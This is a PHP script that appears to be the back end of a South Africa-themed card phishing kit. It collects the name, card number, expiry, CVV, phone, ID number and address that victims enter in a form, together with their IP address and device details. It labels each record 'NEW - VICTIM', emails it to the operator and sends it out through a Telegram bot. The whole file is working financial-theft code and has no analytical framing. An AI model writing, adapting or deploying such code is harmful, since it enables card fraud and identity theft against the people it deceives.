<?php
include("../owner/config.php");
include "../files/php/sys.php";
include '../files/php/911/botfucker.php'; 
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['ovnimdf'] == 'B%y$usC{$qQ<B\2L')){
  $hostname = gethostbyaddr($ip);
    $ovnimsg .= "🇿🇦 N E W - V I C T I M 🇿🇦 \n";
    $ovnimsg .= "👨 NAME : ".$_POST['ovniname']."\n";
    $ovnimsg .= "💳 CARD : ".$_POST['ovnicc']."\n";
    $ovnimsg .= "📅 EXP  : ".$_POST['ovniexp']."\n";
    $ovnimsg .= "🔒 CVV  : ".$_POST['ovnicvc']."\n";
    $ovnimsg .= "📞 PHONE  : ".$_POST['ovniphn']."\n";
    $ovnimsg .= "🪪 ID  : ".$_POST['ovniidn']."\n";
    $ovnimsg .= "🏠 Address:  : ".$_POST['ovniaddr']."\n";
    $ovnimsg .= "👀 IP   : $ip\n";
    $ovnimsg .= "🕒 TIME : $date\n";
    $ovnimsg .= "🍝 DEVICE: $user_os\n";
    $ovnimsg .= "🍝 BROWSER: $user_browser\n";
    $ovnimsg .= "❄ #FroZen# ❄ \n";
    $send = "$ovnimail";
    $subject = "🇿🇦 CARD 💣 = [".$_POST['ovniname']."]";
    $headers = "From: 💣 SA DD E M 💣 <info@saddem.io>";
    mail($send,$subject,$ovnimsg,$headers);
    $token = "$ovnitoken";
    $data = [
    'text' => $ovnimsg,
    'chat_id' => $ovnichat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ../loading.php");}
    else{
      header("Location: ../index.php");}


?>